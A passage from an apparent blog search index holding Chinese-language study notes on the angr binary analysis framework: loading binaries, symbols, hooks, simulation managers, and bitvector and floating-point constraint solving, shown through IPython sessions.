Out[24]: 0xd008000         # 查看主对象的plt表 In [26]: proj.loader.main_object.plt Out[26]: {u'__gmon_start__': 0x80484f0,  u'__isoc99_fscanf': 0x80484d0,  u'__isoc99_scanf': 0x8048550,  u'__libc_start_main': 0x8048510,  u'exit': 0x8048500,  u'fopen': 0x8048540,  u'printf': 0x80484c0,  u'puts': 0x80484e0,  u'read': 0x80484b0,  u'setvbuf': 0x8048530,  u'strcmp': 0x80484a0,  u'write': 0x8048520}  # 查看pic开启情况  In [27]: proj.loader.main_object.pic  Out[27]: False  # 查看程序中是否存在可执行栈  In [28]: proj.loader.main_object.execstack  Out[28]: False   工厂（factory）   在angr中有许多类，并且他们大多数都需要一个工程来实例化。我们提供project.factory，其中对常见的对象提供了许多可用的构造器，这一节也会介绍很多angr的基础概念。   块（block）   首先，我们有project.factory.block()，可以用来解析给定地址的基本代码块。这是一个重要的事实angr分析代码是以块为单位的，你会获得一个块对象，可以给你提供许多有趣的信息。      # 查看块的指令数量大小 In [61]: block.instructions Out[61]: 0xd # 指令地址 In [62]: block.instruction_addrs Out[62]: [0x8048560L, 0x8048562L, 0x8048563L, 0x8048565L,  0x8048568L, 0x8048569L, 0x804856aL, 0x804856bL,  0x8048570L, 0x8048575L, 0x8048576L, 0x8048577L,  0x804857cL]   同样可以用capstone来反编译代码块，或者使用vex来转换成IR。   状态（states）   这是关于angr的另一个基本概念，Project对象仅仅代表了程序的初始化镜像。当使用angr进行执行操作时，你操作的都是一种特殊的对象即代表了一个模拟的程序状态，叫做SimState。      In [71]: state = proj.factory.entry_state() # 获取程序入口点的状态 In [72]: state Out[72]: &lt;SimState @ 0x8048560&gt;   SimState包含了一个程序的内存，寄存器，文件流数据等等。任何可以被执行更改的live data在程序中都有一个状态。使用state.regs和state.mem来获取寄存器内容和内存。   # 获取当前状态的eip In [101]: state.regs.eip Out[101]: &lt;BV32 0x8048560&gt; # 获取ebx寄存器 In [102]: state.regs.ebx Out[102]: &lt;BV32 reg_14_5_32{UNINITIALIZED}&gt; # 获取内存，转化为int型 In [104]: state.mem[proj.entry].int.resolved Out[104]: &lt;BV32 0x895eed31&gt;   这些不是python类型的数据，是位向量bitvectors，用来代表CPU的运行数据，每个位向量都有length特性来描述数据长度。同时可以尝试将python的int型转成位向量。   # BitVectors和python数据相互转换 # 产生位向量，32位的值是0x1234 In [112]: bv = state.solver.BVV(0x1234,32) Out[113]: &lt;BV32 0x1234&gt; # 求解位向量 In [114]: state.solver.eval(bv) Out[114]: 0x1234  In [45]: state.solver.eval(state.mem[proj.entry].int.resolved) Out[45]: 0xfa1e0ff3   也可以将值存储到寄存器和内存中，或者直接使用python的int，它会被转换成适当大小的位向量。      关于mem是令人困惑的，具体怎样使用：      使用数组和下标的形式来访问地址。   使用.&lt;type&gt;来指定某块内存被解释成某种特定的类型。除此之外，均可使用位向量或python类型来给其赋值。   使用.resolved来获取位向量值，使用.concrete来获取python变量类型。   对于寄存器而言，会有一些奇怪的变量，如下所示。   In [135]: state.regs.edi Out[135]: &lt;BV32 reg_24_10_32{UNINITIALIZED}&gt;   这是一个32位的向量，但是它不包含任何数值类型的值。这叫做符号变量，是在符号执行的基础上产生的。   模拟管理器（simulation managers）   如果一个状态及时反映了给定时间的程序运行，这就肯定会有一种方式来获得其下一个状态。模拟管理器是在angr中首选的接口来进行执行或模拟操作，无论你干什么，都必须和状态有关。 让我们展示如何在向前走了几步之后，如何访问我们之前标记过的一个状态。 首先，我们创建模拟管理器，构造器的参数可以是一个或多个的状态。      In [5]: state = proj.factory.entry_state() Out[6]: &lt;SimState @ 0x8048560&gt;  In [7]: simgr = proj.factory.simulation_manager(state) Out[8]: &lt;SimulationManager with 1 active&gt;  In [20]: simgr.active[0] Out[20]: &lt;SimState @ 0x8048560&gt;   仿真管理器可以包含许多状态的储藏（stash，和git中的git stash差不多，存储状态），默认的stash是activate，是通过我们给的值来初始化的。我们可以查看simgr.activate[0]来查看原始状态。   In [18]: simgr.step() Out[18]: &lt;SimulationManager with 1 active&gt;      我们刚刚对一个基本块进行了符号执行操作。我们可以查看激活的stash（activate stash），注意到它已经被修改了，但是他的原始状态并没有被修改。你可以安全的使用一个单独的状态作为基础态，然后进行多轮复杂的符号执行等操作。   # 新的状态 In [21]: simgr.active[0].regs.eip Out[21]: &lt;BV32 0x8048510&gt; # 原始状态 In [22]: state.regs.eip Out[22]: &lt;BV32 0x8048560&gt;   分析   angr中有许多内置的分析工具，你可以用他们来解析一些有趣的信息proj.analyses.包括CFG等等，更多的文档在angr的API文档中有提及。通过一个简单的例子告诉你怎么构建控制流图CFG。   In [11]: proj = angr.Project('./su_pwn100', auto_load_libs=False) # 取消自动加载库文件 In [12]: cfg = proj.analyses.CFGFast() # cfg.graph是networkx DiGraph 实例，参考networkx APIs来使用 In [13]: cfg.graph Out[13]: &lt;networkx.classes.digraph.DiGraph at 0x7f9056bfaed0&gt; # 获取给定地址的CFGNode In [14]: entry_node = cfg.get_any_node(proj.entry)  In [16]: list(cfg.graph.successors(entry_node)) Out[16]: [&lt;CFGNode 0x8048510[6]&gt;]   ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-1.html",
        "teaser":null},{
        "title": "Angrlearning 2",
        "excerpt":"   angr 学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第二节开始 加载二进制文件-CLE和angr工程      加载器（loader）   加载对象   CLE加载器展示了加载对象的全貌，加载并映射到一个单独的地址空间中。每一个文件都被加载器的backend识别，以处理各种不同的文件格式。 而且，内存中的对象可能不对应任何一个文件，比如是为了支持线程局部存储（tls），而外部对象则用来保证提供未解析的符号。 通过使用loader.all_objects，获取整个CLE已经加载的对象列表，以及更有针对性的分类情况等等：   # loader对象 In [4]: proj.loader Out[4]: &lt;Loaded true, maps [0x400000:0x5008000]&gt;  # 所有对象 In [5]: proj.loader.all_objects Out[5]: [&lt;ELF Object true, maps [0x400000:0x409217]&gt;,  &lt;ELF Object libc-2.28.so, maps [0x1000000:0x11c363f]&gt;,  &lt;ELF Object ld-2.28.so, maps [0x2000000:0x202b117]&gt;,  &lt;ELFTLSObject Object cle##tls, maps [0x3000000:0x3015010]&gt;,  &lt;ExternObject Object cle##externs, maps [0x4000000:0x4008000]&gt;,  &lt;KernelObject Object cle##kernel, maps [0x5000000:0x5008000]&gt;]  # 主对象 In [6]: proj.loader.main_object Out[6]: &lt;ELF Object true, maps [0x400000:0x409217]&gt;  # 共享对象 In [7]: proj.loader.shared_objects Out[7]: OrderedDict([('true', &lt;ELF Object true, maps [0x400000:0x409217]&gt;),              ('libc.so.6',               &lt;ELF Object libc-2.28.so, maps [0x1000000:0x11c363f]&gt;),              ('ld-linux-x86-64.so.2',               &lt;ELF Object ld-2.28.so, maps [0x2000000:0x202b117]&gt;)])  # 还有extern kernel等等  # 查看某个地址属于的对象 In [16]: proj.loader.find_object_containing(0x1000000) Out[16]: &lt;ELF Object libc-2.28.so, maps [0x1000000:0x11c363f]&gt;   我们可以直接和这些对象进行交互，以获得我们想要的元数据：   In [38]: obj = proj.loader.main_object # 入口点 In [39]: obj.entry Out[39]: 0x8048560 # 最低地址 In [40]: obj.min_addr Out[40]: 0x8048000 # 最高地址 In [41]: obj.max_addr Out[41]: 0x804a087  # 段 In [42]: obj.segments Out[42]: &lt;Regions: [ &lt;ELFSegment flags=0x4, vaddr=0x400000, memsize=0x1168, filesize=0x1168, offset=0x0&gt;, &lt;ELFSegment flags=0x5, vaddr=0x402000, memsize=0x30f1, filesize=0x30f1, offset=0x2000&gt;, &lt;ELFSegment flags=0x4, vaddr=0x406000, memsize=0x1b00, filesize=0x1b00, offset=0x6000&gt;, &lt;ELFSegment flags=0x6, vaddr=0x408c70, memsize=0x5a8, filesize=0x410, offset=0x7c70&gt;]&gt;  # 节 In [43]: obj.sections Out[43]: &lt;Regions: [&lt;Unnamed | offset 0x0, vaddr 0x0, size 0x0&gt;,  &lt;.interp | offset 0x154, vaddr 0x8048154, size 0x13&gt;,  &lt;.note.ABI-tag | offset 0x168, vaddr 0x8048168, size 0x20&gt;,  &lt;.note.gnu.build-id | offset 0x188, vaddr 0x8048188, size 0x24&gt;,  &lt;.gnu.hash | offset 0x1ac, vaddr 0x80481ac, size 0x2c&gt;,  &lt;.dynsym | offset 0x1d8, vaddr 0x80481d8, size 0x100&gt;,  &lt;.dynstr | offset 0x2d8, vaddr 0x80482d8, size 0xb6&gt;,  &lt;.gnu.version | offset 0x38e, vaddr 0x804838e, size 0x20&gt;,  &lt;.gnu.version_r | offset 0x3b0, vaddr 0x80483b0, size 0x40&gt;,  &lt;.rel.dyn | offset 0x3f0, vaddr 0x80483f0, size 0x18&gt;,  &lt;.rel.plt | offset 0x408, vaddr 0x8048408, size 0x60&gt;,  &lt;.init | offset 0x468, vaddr 0x8048468, size 0x23&gt;,  &lt;.plt | offset 0x490, vaddr 0x8048490, size 0xd0&gt;,  &lt;.text | offset 0x560, vaddr 0x8048560, size 0x2d2&gt;,  &lt;.fini | offset 0x834, vaddr 0x8048834, size 0x14&gt;,  &lt;.rodata | offset 0x848, vaddr 0x8048848, size 0x9b&gt;,  &lt;.eh_frame_hdr | offset 0x8e4, vaddr 0x80488e4, size 0x34&gt;,  &lt;.eh_frame | offset 0x918, vaddr 0x8048918, size 0xd0&gt;,  &lt;.init_array | offset 0xf08, vaddr 0x8049f08, size 0x4&gt;,  &lt;.fini_array | offset 0xf0c, vaddr 0x8049f0c, size 0x4&gt;,  &lt;.jcr | offset 0xf10, vaddr 0x8049f10, size 0x4&gt;,  &lt;.dynamic | offset 0xf14, vaddr 0x8049f14, size 0xe8&gt;,  &lt;.got | offset 0xffc, vaddr 0x8049ffc, size 0x4&gt;,  &lt;.got.plt | offset 0x1000, vaddr 0x804a000, size 0x3c&gt;,  &lt;.data | offset 0x103c, vaddr 0x804a03c, size 0x8&gt;,  &lt;.bss | offset 0x1044, vaddr 0x804a060, size 0x28&gt;,  &lt;.comment | offset 0x1044, vaddr 0x0, size 0x2b&gt;,  &lt;.shstrtab | offset 0x106f, vaddr 0x0, size 0x106&gt;,  &lt;.symtab | offset 0x1628, vaddr 0x0, size 0x4f0&gt;,  &lt;.strtab | offset 0x1b18, vaddr 0x0, size 0x32a&gt;]&gt;   # 根据地址找节 In [29]: main.find_section_containing(main.entry) Out[29]: &lt;.text | offset 0x2020, vaddr 0x402020, size 0x30c3&gt;  # 根据地址找段 In [30]: main.find_segment_containing(main.entry) Out[30]: &lt;ELFSegment flags=0x5, vaddr=0x402000, memsize=0x30f1, filesize=0x30f1, offset=0x2000&gt;  # plt表函数地址（未开启pic可用） In [56]: obj.plt['write'] Out[56]: 0x8048520 # 反查函数名（未开启pic可用） In [57]: obj.reverse_plt[0x8048520] Out[57]: u'write'  # 打印指定的基地址和cle实际映射的基地址 # 链接地址（开启pic会是0） In [34]: main.linked_base Out[34]: 0x0 # 实际映射地址 In [35]: main.mapped_base Out[35]: 0x400000   符号和重定位   当你在使用CLE的时候也可以和符号进行工作，符号是可执行格式的基本概念，将函数名和地址相映射。最简单的方式从CLE中获取符号是使用loader.find_symbol，可以通过名字或者地址，返回一个符号对象。      # 解析read函数 In [15]: proj.loader.find_symbol('read') Out[15]: &lt;Symbol \"read\" in libc.so.6 at 0x90d5b00&gt; # 解析write函数 In [16]: proj.loader.find_symbol('write') Out[16]: &lt;Symbol \"write\" in libc.so.6 at 0x90d5b70&gt; # 解析system函数 In [17]: proj.loader.find_symbol('system') Out[17]: &lt;Symbol \"system\" in libc.so.6 at 0x903ada0&gt;   一个符号最有用的属性是它的名字、所有者和地址，但是符号的地址是模糊的，一个符号有3种地址。      .rebased_addr是在全局地址空间中的地址，也就是打印的地址。   .linked_addr是相对应链接基址的偏移量。   .relative_addr是RVA，相对应目标基地址的偏移量。   # 寻找free符号 In [91]: free = proj.loader.find_symbol('free')  In [92]: free Out[92]: &lt;Symbol \"free\" in libc.so.6 at 0x1085f20&gt;  # free的名字 In [93]: free.name Out[93]: 'free'  # free在整个地址空间中的地址 In [94]: free.rebased_addr Out[94]: 0x1085f20  # 相对于文件基地址的偏移量（链接时候的地址，参见proj.loader.main_object.linked_base） In [95]: free.linked_addr Out[95]: 0x85f20  # 相对于对象基地址的偏移量 In [96]: free.relative_addr Out[96]: 0x85f20  # 所有者 In [97]: free.owner Out[97]: &lt;ELF Object libc-2.28.so, maps [0x1000000:0x11c363f]&gt;   为了提供调试信息，符号也支持动态链接，libc提供malloc作为一个导出符号，然后主程序依附它。如果我们让CLE从主程序中给出一个符号，它会说这是一个导入符号。导入符号不具有和其相关有意义的地址信息，但是他们会提供一个引用符号，指向那个曾经解析他们的符号，用.resolvedby。   # 在主程序中解析，若符号不存在就无解。在loader则使用find_symble来查找 In [43]: main_read = proj.loader.main_object.get_symbol('read') Out[45]: &lt;Symbol \"read\" in su_pwn100 (import)&gt; # 反向解析 In [46]: main_read.resolvedby Out[46]: &lt;Symbol \"read\" in libc.so.6 at 0x90d5b00&gt;   导出和导入符号的联系应该被注册到程序中一块叫重定位的地方。重定位的任务是：当匹配到导出符号时，将格式化导出符号的地址。我们可以使用obj.relocs来查看重定位表，或者用obj.imports来查看所有的导入符号，这里没有和导出符号相关的列表。   In [18]: obj.imports Out[18]: {u'__gmon_start__': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4950&gt;,  u'__isoc99_fscanf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4810&gt;,  u'__isoc99_scanf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4c10&gt;,  u'__libc_start_main': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f47d0&gt;,  u'exit': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4850&gt;,  u'fopen': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4a50&gt;,  u'printf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4410&gt;,  u'puts': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4750&gt;,  u'read': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4310&gt;,  u'setvbuf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f48d0&gt;,  u'strcmp': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4510&gt;,  u'write': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4990&gt;}   一个重定位有关的导入符号可以通过.symbol来访问，或者import，或者查看重定位表relocs。地址都是通用的，也可以通过.own_obj来访问其解析着。 如果一个导入符号不能被任何一个导出解析，例如共享库丢失了，导入函数解析失败，CLE会自动声明一个额外的对象，loader.extern_obj，称其提供了该导出符号。   加载选项   如果你使用.angr.Project来加载某些东西，并且为加载器提供信息，可以给构造器提供关键的参数，它将会传递给CLE。这里我们将复习一些常用和重要的选项。   基础选项   我们已经讨论过了auto_load_libs，它禁止angr去自动地解析共享依赖关系，默认开启。相对的选项是except_missing_libs，如果开启，当文件的共享库不能被解析时，会产生异常。 你可以给force_load_libs传字符串列表，其中的值将会被视为未被解决的共享库。给skip_libs传参可以阻止某个lib被解析。另外可以使用ld_path自定义共享库的地址。默认的共享库位置是程序的同目录、当前的项目目录、系统共享库。   执行文件前的选项   如果你想要指定一些特殊的参数只应用于特殊的文件时，CLE允许你那样做。参数main_opts和lib_opts使用字典作为选项，main_opts从选项名映射到选项值，lib_opts从库名映射到一个从选项名映射到选项值的字典。 你可以使用的选项有很多，一些常用的如下：      backend使用什么后端，类或名   base_addr自定义基址   entry_point自定义入口点   arch自定义架构   例子：   angr.Project(main_opts={'backend': 'ida', 'custom_arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})   后端backends   CLE当前有许多后端来静态加载elf、pe、cgc、mach-o、elf-dump文件，也可以加载ida文件，把文件加载到平坦内存中。CLE大多数情况下会自动分析当前的文件来选择恰当的后端，我们没必要手动指定，除非你在处理一些特殊的东西。   你可以通过字典选项中的key来强制CLE来使用具体的后端，就如上文所述。一些后端不会自动的指定使用什么类型的架构，所以必须手动指定arch。这个值不需要和angr架构列表中的值匹配，angr会自动识别你指定的架构。关于后端的值可以参考API。一般情况下都不需要指定，在使用ida文件时需要指定。   符号化功能总结   默认的，angr工程尝试将所有的外部调用替换为库函数，通过的这种方式被称作模拟程序-仅仅只有python的函数能高效地模拟这个状态。我们应用了一整套的函数来作为模拟程序，这些内置的函数是在angr.SIM_PROCEDURES中可获得。命名是两级的，第一级是包名，第二级是库函数名。执行这其中的函数而不是你系统中实际的库函数，使得分析更加可跟踪，但以一些潜在的不准确为代价。   对给定的函数没有这样的可替代情况时：      如果auto_load_libs开启，（默认开启）真实的库函数是会执行的，这可能不是你想要的结果，但这取决于实际情况。例如：有的函数是极端复杂难以分析，如果尝试执行将可能造成路径状态爆炸。   如果auto_load_libs关闭，那么外部函数是未解析的，那么程序将会解析他们成为一个抽象的stub进行模拟，被叫做ReturnUnconstrained。它每次调用将返回一个独特的无约束的符号值。   如果use_sim_procedures（这是angr.Project的参数）关闭，（默认开启）只有由外部对象提供的符号会被替换成模拟程序，它们将被替换成ReturnUnconstrained，只返回一个符号值。   你可以指定一个特殊的符号来防止某些函数被替换，通过angr.Project的exclude_sim_procedures_list和exclude_sim_procedures_func参数。   参考angr.Project._register_object来获得准确用法。   hook   这种用python摘要来替代库代码的方式就是hook，你也可以自己做。当执行模拟的时候，每一步angr都会检测当前的地址是否被hook，如果被hook，运行hook代码而不是原本地址的代码。   你也可以使用proj.hook(addr, hook)API来使用，hook参数是模拟程序实例，你可以管理工程的hooks通过.is_hooked，.unhook和unhook_by。 通过使用一个可以替换的API来hook地址，就能使用自己设置的函数了，即通过proj.hook(addr)作为装饰器。如果你真这么做了，你可以指定一个可选项length关键字当hook结束后来使程序跳转到多少字节远。   In [10]: stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # 地址hook In [11]: proj.hook(0x10000,stub_func) CRITICAL | 2018-04-11 10:50:56,311 | angr.project | Hooking with a SimProcedure class is deprecated! Please hook with an instance.  # 地址是否hook In [14]: proj.is_hooked(0x10000) Out[14]: True # 被谁hook In [21]: proj.hooked_by(0x10000) Out[21]: &lt;SimProcedure ReturnUnconstrained&gt; # 取消hook In [15]: proj.unhook(0x10000)  # 自定义hook函数，定义完就执行自动hook，立即生效 In [25]: @proj.hook(0x2000, length=5)    ....: def my_hook(state):    ....:     state.regs.eax = 52    ....:  # 检测hook In [26]: proj.is_hooked(0x2000) Out[26]: True # 被谁hook In [31]: proj.hooked_by(0x2000) Out[31]: &lt;SimProcedure UserHook&gt;   更多的是，你可以使用proj.hook_symbol(name, hook)第一个参数是符号名，当符号存在时hook地址。一种重要的使用方式就是扩大angr的内置库模拟程序。因为这些库只是类，你可以生成子类，重写他们的行为，并在hook中使用他们的子类。   到目前还好   到现在为止，你应该对分析发生的事进行怎样的控制有了比较好的理解，在CLE加载器和angr工程层面中。你也应该理解angr使用合理的尝试通过hook复杂的库函数，使用模拟程序总结函数的影响来化简它的分析。 为了掌握可以在CLE加载器所做的所有事，请参考CLE API文档。  ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2019-01/AngrLearning-2.html",
        "teaser":null},{
        "title": "Angrlearning 3",
        "excerpt":"   angr 学习笔记，结合官方文档和网上资料整理，加强理解 从angr第二章第三节开始 求解工程      符号表达式和约束求解   angr的能力不仅是能做模拟器，而且能执行被称为符号变量的东西。它保持了一个符号，仅仅是一个名字，而不是一个具体的数值。之后精选算术操作的时候，会生成树形操作序列（编译原理中的抽象语法树AST）。 AST可以被翻译给SMT求解器进行约束求解，即根据操作的序列输出，得到输入。这里你将学习使用angr来解决这个问题。   操作位向量   In [1]: import monkeyhex In [2]: from angr import * In [3]: proj = Project(\"/bin/true\") WARNING | 2019-02-17 14:10:17,669 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.  In [6]: state = proj.factory.entry_state()  In [7]: state Out[7]: &lt;SimState @ 0x402110&gt;   位向量就是比特序列流，用有界的整数来解释算术。   # 64bit长度值是1的位向量 In [5]: one = state.solver.BVV(1,64) Out[6]: &lt;BV64 0x1&gt;  # 64bit长度值是100的位向量 In [7]: one_hundred = state.solver.BVV(100,64) Out[8]: &lt;BV64 0x64&gt;  # 27bit长度值是9的位向量 In [9]: weird_nine = state.solver.BVV(9, 27) Out[10]: &lt;BV27 0x9&gt;   我们可以拥有任意长度的向量，我们也可以对其进行算术操作。   # 加减运算 In [11]: one + one_hundred Out[11]: &lt;BV64 0x65&gt;  # 加减运算 In [12]: one - one_hundred Out[12]: &lt;BV64 0xffffffffffffff9d&gt;  # python整数会自动转为相应的位向量 In [14]: one +2 Out[14]: &lt;BV64 0x3&gt;  # 乘法就是多个向量相加 In [18]: one_hundred - one*200 Out[18]: &lt;BV64 0xffffffffffffff9c&gt;   不能对长度不同的向量进行算术，这会导致类型错误（用.length检查）。但是我们可以拓展向量长度使其适当。   In [30]: weird_nine.zero_extend(64 - 27) Out[30]: &lt;BV64 0x9&gt;  # 拓展向量长度 In [31]: one + weird_nine.zero_extend(64 - 27) Out[31]: &lt;BV64 0xa&gt;   zero_extend将会填补向量的高位是0，使其长度变长。sign_extend会填补n位，值是当前的最高位。   In [29]: state.solver.BVV(7,3).zero_extend(1) Out[29]: &lt;BV4 7&gt;  In [30]: state.solver.BVV(7,3).sign_extend(1) Out[30]: &lt;BV4 15&gt;   现在让我们开始介绍一些符号。   # 构造一个64长度的位向量符号 In [52]: x = state.solver.BVS('x', 64) Out[53]: &lt;BV64 x_1_64&gt;  # 构造一个64长度的位向量符号 In [54]: y = state.solver.BVS('y', 64) Out[55]: &lt;BV64 y_2_64&gt;   x和y都是符号变量，这就是你在7年级学到的变量。注意你提供的变量名后面跟上了一个递增的数字。无论你做什么都不会得到具体的数字，你只会得到AST。   In [56]: x + one Out[56]: &lt;BV64 x_1_64 + 0x1&gt;  In [57]: x - y Out[57]: &lt;BV64 x_1_64 - y_2_64&gt;  In [58]: (x + one)/2 Out[58]: &lt;BV64 (x_1_64 + 0x1) / 0x2&gt;  In [59]: (x + one)*2 Out[59]: &lt;BV64 (x_1_64 + 0x1) * 0x2&gt;   典型地将，BVV和BVS都是ASTs，所有位向量都是AST操作符，即使树的深度只有一层，为了理解这个，让我们理解如何构建ASTs。   每个抽象语法树都有操作符和参数，即op和args。op是当前进行的操作，args是操作符作用的值。除非op是BVV或者BVS，args是其他AST，树通常以BVV或者BVS结束。   In [41]: tree = (x + 1) * (y - 2)  # 第一层符号 In [42]: tree.op Out[42]: '__mul__'  # 第一层参数 In [43]: tree.args Out[43]: (&lt;BV64 x_0_64 + 0x1&gt;, &lt;BV64 y_1_64 - 0x2&gt;)  # 左儿子符号 In [44]: tree.args[0].op Out[44]: '__add__'  # 左儿子的左儿子 In [45]: tree.args[0].args[0] Out[45]: &lt;BV64 x_0_64&gt;  # 左儿子的左儿子符号 In [46]: tree.args[0].args[0].op Out[46]: 'BVS'  # 左儿子的左儿子参数 In [47]: tree.args[0].args[0].args Out[47]: ('x_0_64', None, None, None, False, False, None)  # 左儿子的右儿子符号 In [48]: tree.args[0].args[1].op Out[48]: 'BVV'  # 左儿子的右儿子参数 In [49]: tree.args[0].args[1].args Out[49]: (0x1, 0x40)   从这里我们看到，我们用位向量指代任何顶级操作会产生位向量的AST，可以通过AST来表示其他类型的值，包括浮点数，布尔类型，接下来就会看到。   符号约束   在任何两个相似的AST之间进行比较操作，将将产生一个新的AST，不是位向量，是符号布尔值。   In [27]: x ==1 Out[27]: &lt;Bool x_0_64 == 0x1&gt;  In [28]: x == one Out[28]: &lt;Bool x_0_64 == 0x1&gt;  In [29]: x &gt;3 Out[29]: &lt;Bool x_0_64 &gt; 0x3&gt;  In [30]: x + y == one_hendred+ 5 Out[30]: &lt;Bool (x_0_64 + y_1_64) == 0x69&gt;  In [31]: one &gt;0 Out[31]: &lt;Bool True&gt; # 和负数比较出错 In [32]: one &gt;-1 Out[32]: &lt;Bool False&gt;   你可以看到，默认的比较方式是无符号的，负数将使用补码表示，所以肯定比正数大，如果我们想要和负数比较，可以使用.SGT(-5)即有符号下判断其是否比-5大。优先级比普通的符号高。   In [56]: onehundred = state.solver.BVV(100, 32)  In [57]: onehundred.SGE(-5) Out[57]: &lt;Bool True&gt;   这个小片段也说明了很重要的一点，不要在angr中使用变量的直接比较，如在if表达式或while语句中，因为结果是不可预知的。即使有一个准确的值，这种方式会抛出异常，你应该使用solver.is_true和solver.is_false，它测试的是具体的正确或者错误，而不执行约束。   In [52]: maybe = x==y Out[53]: &lt;Bool x_0_64 == y_1_64&gt;  # 两个符号比较无意义 In [54]: state.solver.is_true(maybe) Out[54]: False  # 两个符号比较无意义 In [57]: state.solver.is_false(maybe) Out[57]: False   约束求解   你可以将符号布尔值作为对符号变量有效值的一个断言，并将其添加到状态的约束中。之后，你就可以通过计算符号变量表达式，来判断一个符号变量的值是否有效。例子：   # 添加约束条件 In [58]: state.solver.add(x&gt;y) Out[58]: [&lt;Bool x_0_64 &gt; y_1_64&gt;]  In [59]: state.solver.add(y&gt;2) Out[59]: [&lt;Bool y_1_64 &gt; 0x2&gt;]  In [60]: state.solver.add(x&lt;10) Out[60]: [&lt;Bool x_0_64 &lt; 0xa&gt;]  # 计算符号 In [61]: state.solver.eval(x) Out[61]: 0x9L   通过添加这些约束条件，我们强制约束求解器将其作为一个断言，即返回值必须满足所有的条件。如果你不加入更多的约束条件，那么就会得到两个变量的结果，之间具有一致性。   从现在开始，我们很容易就能做这章开头提出来的任务，即给定输出求输入。例子：   In [3]: state = proj.factory.entry_state() In [4]: input = state.solver.BVS('input',32) In [5]: operation = (((input + 4 ) * 3) &gt;&gt; 1) + input In [6]: output = 200  # 添加约束条件 In [7]: state.solver.add(operation == output) Out[7]: [&lt;Bool ((((input_0_32 + 0x4) * 0x3) &gt;&gt; 0x1) + input_0_32) == 0xc8&gt;]  # 计算值 In [8]: state.solver.eval(input) Out[8]: 0x33333381L   请注意，这个方法只适用于位向量，如果我们在整数域上求解就是无解了。   如果我们添加了矛盾或者对立的约束，那么就没有可以分配给这些变量的值以满足约束条件，这个状态就会变得不满足，或unsat，对其的计算将抛出异常。我们可以通过state.satisfiable()来判断约束是否可满足。   从这里我们可以看到，eval是一个通用的方法来将任何位向量转换成python原始变量，同时保持数据完整性。这就是我们为什么用eval将具体的位向量转成python整数的原因。   需要注意的是，变量不与状态进行绑定，定义后任何状态都能访问。   浮点数   z3已经支持IEEE754的浮点数理论，所以angr也支持了。主要的区别是浮点数有种类，而不是宽度width。你可以通过FPV和FPS创造浮点数符号。   In [13]: a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) Out[14]: &lt;FP64 FPV(3.2, DOUBLE)&gt;  In [15]: b = state.solver.FPS('b', state.solver.fp.FSORT_DOUBLE) Out[16]: &lt;FP64 FPS('FP_b_0_64', DOUBLE)&gt;  In [17]: a + b Out[17]: &lt;FP64 fpAdd('RNE', FPV(3.2, DOUBLE), FPS('FP_b_0_64', DOUBLE))&gt;  In [18]: a + 4.2 Out[18]: &lt;FP64 FPV(7.4, DOUBLE)&gt;  In [19]: b + 2 &lt; 0 Out[19]: &lt;Bool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;   有几点需要说明，对于初学者来说，打印浮点数并不明智，但在过去，大多数操作实际上有第三个参数，但在使用二进制运算时，隐式地添加了舍入模式。IEEE754规范支持多个舍入模式，包括最近舍入，像零舍入，向高位舍入，因此z3支持了这些选项。如果你想要显式的指定舍入模式，请指定第一个参数是solver.fp.RM_*中的值。   In [47]: state.solver.fpAdd(state.solver.fp.RM_RTN, state.solver.FPV(0.51, state.solver.fp.FSORT_DOUBLE), 0.51515315135159) Out[47]: &lt;FP64 FPV(1.02515315135159, DOUBLE)&gt;   约束求解的过程是一样的。   In [22]: state.solver.add(b +2 &lt;0) Out[22]: [&lt;Bool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;]  In [23]: state.solver.add(b +2 &gt;-1) Out[23]: [&lt;Bool fpGT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(-1.0, DOUBLE))&gt;]  In [24]: state.solver.eval(b) Out[24]: -2.4999999999999996   这很好，但是有时候我们直接需要位向量格式下的浮点数，你可以使用方法raw_to_bv和raw_to_fp来进行位向量和浮点数直接的转换，反之亦然。   # 浮点转向量 In [29]: a Out[29]: &lt;FP64 FPV(3.2, DOUBLE)&gt;  In [30]: a.raw_to_bv() Out[30]: &lt;BV64 0x400999999999999a&gt;  In [31]: b Out[31]: &lt;FP64 FPS('FP_b_0_64', DOUBLE)&gt;  In [32]: b.raw_to_bv() Out[32]: &lt;BV64 fpToIEEEBV(FPS('FP_b_0_64', DOUBLE))&gt;  # 向量转浮点 In [34]: state.solver.BVV(0,64).raw_to_fp() Out[34]: &lt;FP64 FPV(0.0, DOUBLE)&gt;  In [35]: state.solver.BVS('x',64).raw_to_fp() Out[35]: &lt;FP64 fpToFP(x_1_64, DOUBLE)&gt;   但是，如果你想要展示值更紧密，比如，float和int之间的转换。我们可以使用一组不同的方法，val_to_fp和val_to_bv。这些方法必须将大小作为参数传递，这是由于浮点数的浮点性质。   # float -&gt; int In [75]: a = state.solver.FPV(2.1, 